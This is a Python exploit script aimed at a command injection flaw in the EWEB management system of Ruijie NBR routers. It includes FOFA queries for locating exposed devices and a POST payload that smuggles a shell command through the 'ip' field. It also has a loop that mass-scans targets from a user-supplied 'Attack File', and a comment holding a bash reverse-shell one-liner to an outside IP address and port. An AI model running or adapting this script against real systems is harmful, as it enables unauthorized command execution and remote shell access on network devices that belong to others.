# -*- coding: UTF-8 -*-
# author : Firbasky
import requests
import json
import urllib3



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#解决https ssl问题


"""
锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、
存储等网络设备产品及解决方案的专业化网络厂商。 
锐捷网络 EWEB 网管系统存在远程命令执行漏洞。

影响版本:锐捷 NBR 路由器 EWEB 网管系统  版本 < 2018 可能

fofa:
title="锐捷网络-EWEB网管系统"
icon_hash="-692947551"

"""


def POC_1(target_url):
    vuln_url = target_url + "/guest_auth/guestIsUp.php"
    data = {
      "mac":"1",
      "ip":"127.0.0.1|echo 'nicenice' > 1.txt"
    }
    try:
        response = requests.post(url=vuln_url, data=data,verify=False, timeout=15)
        r = requests.get(target_url+"/guest_auth/1.txt")
        if "nicenice" in r.text:
          print("\033[31m[x] 目标 {} 存在漏洞\033[0m".format(vuln_url))
          #反弹shell bash -i >& /dev/tcp/47.98.163.19/6666 0>&1
    except Exception as e:
        print("\033[31m目标 {} 请求失败 原因:{}\033[0m".format(target_url,e))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "https://" + url
            url = url.strip('\n')
            try:
                POC_1(url)
            except Exception as e:
                print("请求报错:{e}".format(e))
                continue

if __name__ == '__main__':
    file_name  = str(input("\033[35mPlease input Attack File\nFile >>> \033[0m"))
    # ip地址
    Scan(file_name)
            
